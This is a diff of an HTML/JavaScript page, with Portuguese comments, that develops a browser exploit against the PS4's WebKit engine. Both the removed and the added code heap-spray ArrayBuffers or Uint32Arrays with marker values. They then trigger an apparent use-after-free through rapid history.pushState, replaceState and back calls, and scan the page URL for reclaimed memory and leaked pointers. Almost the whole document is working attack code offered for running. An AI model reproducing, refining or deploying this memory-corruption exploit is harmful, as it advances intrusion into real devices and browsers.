@@ -2,122 +2,94 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - Ultimate Butterfly Leak</title>
-<style>
-    body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
-    button { 
-        display: block; width: 100%; max-width: 400px; margin: 10px 0;
-        padding: 15px; background: #1a1a1a; color: #0f0; border: 2px solid #0f0;
-        cursor: pointer; font-weight: bold;
-    }
-    button:hover { background: #0f0; color: #000; }
-    #log { 
-        margin-top: 20px; white-space: pre-wrap; font-size: 12px;
-        border: 1px solid #333; padding: 15px; background: #050505;
-        max-height: 500px; overflow-y: auto;
-    }
-    .ptr { color: #f0f; font-weight: bold; }
-    .success { color: #0ff; }
-</style>
+<title>PS4 WebKit - Large Bin Reclamation</title>
 </head>
 <body>
-<h2>🚀 PS4 WebKit - Butterfly & Address Leak</h2>
-<button onclick="runUltimateTest()">RUN EXPLOIT STRATEGY</button>
-<div id="log"></div>
+
+<h2>PS4 WebKit - Large Bin Reclamation</h2>
+<p>Status: <span id="status">Aguardando...</span></p>
+
+<button onclick="runExploit()">EXECUTAR SPRAY + UAF</button>
+
+<pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m, cls="") {
-    const span = document.createElement("span");
-    if(cls) span.className = cls;
-    span.textContent = m + "\n";
-    logEl.appendChild(span);
-    logEl.scrollTop = logEl.scrollHeight;
-}
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+const statusEl = document.getElementById("status");
 
-// --- TEU GATILHO UAF ORIGINAL ---
-async function triggerUAF() {
-    log("Iniciando Gatilho UAF (history.pushState)...");
+function log(m) { logEl.textContent += m + "\n"; }
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+async function runExploit() {
+    logEl.textContent = "";
+    statusEl.textContent = "Spraying...";
+    
+    // 1. SPRAY DE OBJETOS GRANDES (340KB para bater com o ITER 48)
+    log("Fase 1: Spraying Large ArrayBuffers (340356 bytes)...");
+    let spray = [];
+    const TARGET_SIZE = 340356; 
+    
+    for(let i = 0; i < 200; i++) {
+        let buf = new ArrayBuffer(TARGET_SIZE);
+        let view = new Uint32Array(buf);
+        // Preenche com o marcador 0x1337BEEF + index
+        for(let j = 0; j < view.length; j += 4) {
+            view[j] = 0x1337BEEF;
+            view[j+1] = i; 
+        }
+        spray.push(buf);
+    }
+    log("Spray concluído: 200 blocos de 340KB alocados.");
+
+    // 2. TRIGGER UAF (Seu código estável)
+    statusEl.textContent = "Triggering UAF...";
+    log("Fase 2: Disparando UAF estável...");
+    
     let size = 977;
     const STEP = 14461;
-    for(let i=0; i<48; i++){
-        let char = String.fromCharCode(0x41 + (i % 26));
-        let frag = char.repeat(size);
+    for(let i = 0; i < 48; i++) {
+        // Usando a técnica de % que funcionou no seu teste 2
+        let pattern = "%41%42%43%44"; // ABCD em hex
+        let frag = pattern.repeat(size / 12); 
+        
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+        
+        if(i % 6 === 0) setTimeout(() => history.back(), 0);
+        
         size += STEP;
         await sleep(5);
     }
-    await sleep(20); // Timing reduzido para evitar que o GC limpe o buffer
-}
 
-async function runUltimateTest() {
-    logEl.textContent = "";
-    log("=== INICIANDO ESTRATÉGIA DE RECLAMAÇÃO ===");
+    log("Aguardando estabilização (100ms)...");
+    await sleep(100);
 
-    // 1. PREPARAÇÃO (Heap Spray via fastMalloc)
-    log("Fase 1: Spraying Uint32Arrays (fastMalloc)...");
-    let spray = [];
-    for(let i=0; i<2000; i++) {
-        let a = new Uint32Array(0x100 / 4);
-        a[0] = 0x13370000 + i; // Marcador ID
-        a[1] = 0x41414141;     // Padding
-        a[2] = 0xDEADBEEF;     // Checkpoint
-        // Simulando uma estrutura de Butterfly (Header + Length)
-        a[3] = 0x00000100;     
-        spray.push(a);
-    }
-
-    // 2. DISPARO
-    await triggerUAF();
-
-    // 3. SCAN DE MEMÓRIA RECLAMADA
-    log("Fase 2: Escaneando URL por vazamentos...");
+    // 3. SCAN DE RECLAMAÇÃO
+    statusEl.textContent = "Scanning...";
     let url = document.URL;
-    log("URL Length: " + url.length);
+    log("URL vazada (Length): " + url.length);
 
-    let leakedPointers = [];
-    let foundMarkers = 0;
-
-    for(let i=0; i < url.length - 8; i += 4) {
-        let b0 = url.charCodeAt(i);
-        let b1 = url.charCodeAt(i+1);
-        let b2 = url.charCodeAt(i+2);
-        let b3 = url.charCodeAt(i+3);
-        
-        let val = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
-
-        // Verifica se encontramos o nosso marcador 1337
-        if((val & 0xFFFF0000) === 0x13370000) {
-            let id = val & 0xFFFF;
-            log(`[MARKER] Bloco ${id} encontrado no offset ${i}!`, "success");
-            foundMarkers++;
-            
-            // Se o marcador foi encontrado, os bytes próximos podem ser ponteiros REAIS
-            // que o WebKit colocou lá durante a colisão
-            let p1 = url.charCodeAt(i+4) | (url.charCodeAt(i+5) << 8);
-            let p2 = url.charCodeAt(i+6) | (url.charCodeAt(i+7) << 8);
-            // No PS4, ponteiros costumam ser 0x00007F...
-            if(p2 === 0x0000) {
-                 log(`   CANDIDATO A PONTEIRO: 0x${p2.toString(16)}${p1.toString(16)}`, "ptr");
-            }
+    let found = false;
+    // Procuramos pelo marcador 0x1337BEEF (em ASCII/UTF-8 o valor muda, buscamos por partes)
+    for(let k = 0; k < url.length - 8; k++) {
+        // Checa se os bytes do spray "atropelaram" o buffer da URL
+        if(url.charCodeAt(k) === 0xEF && url.charCodeAt(k+1) === 0xBE) {
+            log("!!! SUCESSO !!!");
+            log("Marcador 0xBEEF encontrado no offset: " + k);
+            found = true;
+            break;
         }
     }
 
-    if(foundMarkers > 0) {
-        log(`\n!!! SUCESSO !!!`, "success");
-        log(`${foundMarkers} blocos controlados colidiram com o UAF.`);
-        log("Analise os offsets para identificar a estrutura da Butterfly.");
-    } else {
-        log("\nFalha: Nenhum marcador 0x1337 encontrado.");
-        log("Sugestão: Tente aumentar o spray para 4000 ou mudar o tamanho do Uint32Array.");
+    if(!found) {
+        log("Falha: Marcador não encontrado. Tentando dump parcial...");
+        log("Primeiros 100 caracteres: " + url.substring(0, 100));
     }
 
-    window.keepAlive = spray; // Impede que o GC limpe o nosso spray
-    log("\n=== TESTE FINALIZADO ===");
+    window.keepAlive = spray;
+    statusEl.textContent = "Concluído.";
 }
 </script>
+
 </body>
 </html>
